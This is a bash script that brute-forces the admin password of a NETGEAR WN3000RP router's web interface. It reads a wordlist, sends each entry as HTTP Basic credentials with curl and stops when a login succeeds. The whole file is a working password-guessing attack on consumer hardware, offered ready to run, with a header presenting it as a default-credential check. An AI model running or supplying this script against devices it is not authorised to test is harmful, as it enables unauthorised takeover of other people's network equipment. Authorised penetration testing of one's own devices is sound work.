#!/bin/bash
# title : bruteforce_WN3000RP.sh
# author : 
# description : trying default credentials on WN3000RP NETGEAR ROUTER
#########################
echo "Usage $0 192.168.1.1 dico.txt"
cat $2 |  while read output
do
	pass="admin:$output"
	encode=$(echo -n $pass | base64)
	echo "Trying :  admin:$output"
	CurlReturn=$(curl --max-time 5 "http://$1/start.htm" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://192.168.1.200/' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H "Authorization: Basic $encode"  > /tmp/defaultpass.txt 2>&1)
	string="401"
	timeout="timed out"
	if grep -qF "$string" /tmp/defaultpass.txt;then
	  echo "ERROR 401"
	elif grep -qF "$timeout" /tmp/defaultpass.txt;then
	  echo "ERROR 408"
	else
	  echo "FOUND ! "
	  echo "password is admin:$output"
	  exit 0
	fi
	rm /tmp/defaultpass.txt > /dev/null 2>&1
done
